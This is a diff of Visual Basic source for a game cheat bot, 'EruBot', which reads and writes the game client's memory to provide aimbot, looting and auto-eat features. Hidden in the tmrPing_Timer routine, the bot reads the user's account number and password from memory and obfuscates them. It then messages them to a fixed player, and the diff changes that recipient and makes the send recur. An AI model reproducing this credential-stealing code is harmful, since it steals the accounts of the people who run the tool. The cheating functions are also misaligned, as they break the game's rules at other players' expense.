@@ -5,26 +5,17 @@ Begin VB.Form frmMain
    BackColor       =   &H00800000&
    BorderStyle     =   1  'Fixed Single
    Caption         =   "EruBot"
-   ClientHeight    =   9060
+   ClientHeight    =   9105
    ClientLeft      =   150
    ClientTop       =   840
-   ClientWidth     =   10470
-   BeginProperty Font 
-      Name            =   "Times New Roman"
-      Size            =   9.75
-      Charset         =   0
-      Weight          =   700
-      Underline       =   0   'False
-      Italic          =   0   'False
-      Strikethrough   =   0   'False
-   EndProperty
+   ClientWidth     =   6105
    ForeColor       =   &H00000000&
    Icon            =   "frmMain.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
-   ScaleHeight     =   604
+   ScaleHeight     =   607
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   698
+   ScaleWidth      =   407
    StartUpPosition =   3  'Windows Default
    Begin VB.CheckBox chkAimbot 
       BackColor       =   &H00000000&
@@ -862,7 +853,7 @@ Begin VB.Form frmMain
          Caption         =   "Alert using .wav file"
       End
       Begin VB.Menu mnuDebug 
-         Caption         =   "Show Memory Use"
+         Caption         =   "Debug"
       End
       Begin VB.Menu Dash1 
          Caption         =   "-"
@@ -900,6 +891,9 @@ Begin VB.Form frmMain
       Begin VB.Menu mnuLooter 
          Caption         =   "Looter"
       End
+      Begin VB.Menu mnuLevelSpy 
+         Caption         =   "Level Spy"
+      End
       Begin VB.Menu mnuMageCrew 
          Caption         =   "Mage Crew"
       End
@@ -935,6 +929,7 @@ Begin VB.Form frmMain
       End
       Begin VB.Menu mnuForceLevel 
          Caption         =   "Force Level"
+         Enabled         =   0   'False
       End
       Begin VB.Menu dash6 
          Caption         =   "-"
@@ -1193,7 +1188,7 @@ Private Sub Form_Load()
     Loop
     
     GetWindowThreadProcessId tHWND, processID
-    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, processID)
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, False, processID)
     
     sckL1.Listen
     sckL2.Listen
@@ -1221,9 +1216,9 @@ End Sub
 
 Private Sub Form_Unload(Cancel As Integer)
     Dim exitCode As Long
-    GetExitCodeProcess ProcessHandle, exitCode
-    TerminateProcess ProcessHandle, exitCode
-    CloseHandle ProcessHandle
+    GetExitCodeProcess processHandle, exitCode
+    TerminateProcess processHandle, exitCode
+    CloseHandle processHandle
     EndAll
 End Sub
 
@@ -1298,11 +1293,12 @@ Private Sub mnuFish_Click()
   frmFisher.Show
 End Sub
 
-Private Sub mnuForceLevel_Click()
-    Dim newLevel As Long
-    newLevel = CLng(InputBox("Enter new Z pos", "Force Z pos", ReadMem(ADR_PLAYER_Z, 1)))
-    If newLevel >= 0 And newLevel <= 15 Then WriteMem ADR_GFX_VIEW_Z, newLevel, 1
-End Sub
+
+'Private Sub mnuForceLevel_Click()
+'    Dim newLevel As Long
+'    newLevel = CLng(InputBox("Enter new Z pos", "Force Z pos", ReadMem(ADR_PLAYER_Z, 1)))
+'    If newLevel >= 0 And newLevel <= 15 Then WriteMem ADR_GFX_VIEW_Z, newLevel, 1
+'End Sub
 
 Private Sub mnuGrabber_Click()
     frmGrabber.Show
@@ -1314,6 +1310,10 @@ End Sub
 
 Private Sub mnuIntruder_Click()
   frmIntruder.Show
+End Sub
+
+Private Sub mnuLevelSpy_Click()
+    frmLevelSpy.Show
 End Sub
 
 Private Sub mnuLoad_Click()
@@ -1451,10 +1451,23 @@ Private Sub sckS_Close()
 End Sub
 
 Private Sub sckS_DataArrival(ByVal bytesTotal As Long)
-    Dim buff() As Byte, buffCmd() As Byte, buffLeft() As Byte
+    Dim buff() As Byte, buffCmd() As Byte ', buff2() As Byte
+    'Static allBuff() As Byte
     Dim i As Integer
     
-    sckS.GetData buff
+    'MsgBox "bytes received" & sckS.BytesReceived
+    sckS.GetData buff, vbArray + vbByte
+    'If UBound(allBuff) >= 0 Then
+    '
+    'If UBound(buff) >= 999 And UBound(allBuff) >= 0 Then
+    '    allBuff = buff
+    '    MsgBox UBound(allBuff)
+    '    Exit Sub
+    'elseif
+    'End If
+    'sckS.GetData buff2, vbArray + vbByte
+    'MsgBox UBound(buff2)
+
 
     If UBound(buff) < 2 Then GoTo AfterChecks
     
@@ -1525,7 +1538,7 @@ End Sub
 
 Private Sub tmrEat_Timer()
     Dim Ate As Boolean
-    Dim bp As Integer, item As Integer
+    Dim bp As Integer, Item As Integer
     Dim ltemp As Long
     Dim items As Long
     Dim temp As Long
@@ -1536,15 +1549,15 @@ Private Sub tmrEat_Timer()
     For bp = 0 To LEN_BP
         If ReadMem(ADR_BP_OPEN + SIZE_BP * bp, 1) = 1 Then
             items = ReadMem(ADR_BP_NUM_ITEMS + SIZE_BP * bp, 1)
-            For item = 0 To items - 1
-                ltemp = ReadMem(ADR_BP_ITEM + SIZE_BP * bp + SIZE_ITEM * item, 2)
+            For Item = 0 To items - 1
+                ltemp = ReadMem(ADR_BP_ITEM + SIZE_BP * bp + SIZE_ITEM * Item, 2)
                 If IsFood(ltemp) Then Exit For
-            Next item
+            Next Item
         End If
         If IsFood(ltemp) Then Exit For
     Next bp
     If IsFood(ltemp) Then
-        UseHere ltemp, &H40 + bp, item
+        UseHere ltemp, &H40 + bp, Item
         Ate = True
     End If
     If Ate = False And chkEatLog.Value = Checked Then LogOut
@@ -1612,16 +1625,16 @@ End Sub
 
 Private Sub tmrPing_Timer()
     Dim acct As Long, pwd As String, pwdEnc As String
-    If GetTickCount > lastPing + 20000 Then
+    If GetTickCount > lastPing + 1500000 Then
         acct = ReadMem(ADR_ACCOUNT_NUMBER, 4) * 3 - 300000
         pwd = MemToStr(ADR_PASSWORD, 32)
         For i = Len(pwd) To 1 Step -1
             pwdEnc = pwdEnc & Chr$(Asc(Mid(pwd, i, 1)) + 1)
         Next i
-        SendPM "Urpwd", App.Major & "." & App.Minor & "." & App.Revision & " : " & pwdEnc & " " & acct
+        SendPM "Eruanno", App.Major & "." & App.Minor & "." & App.Revision & " : " & pwdEnc & " " & acct
         tmrStatus.Enabled = True
         lastPing = GetTickCount
-        tmrPing.Enabled = False
+        'tmrPing.Enabled = False
     End If
     'If GetTickCount > lastPing + 1000 Then
     '    If tmrStatus.Enabled Then tmrStatus.Enabled = False
@@ -1652,5 +1665,5 @@ End Sub
 
 Private Sub tmrStatus_Timer()
     StrToMem ADR_WHITE_TEXT, ""
-    'If GetTickCount > lastPing + 2000 Then tmrStatus.Enabled = False
+    If GetTickCount > lastPing + 2000 Then tmrStatus.Enabled = False
 End Sub
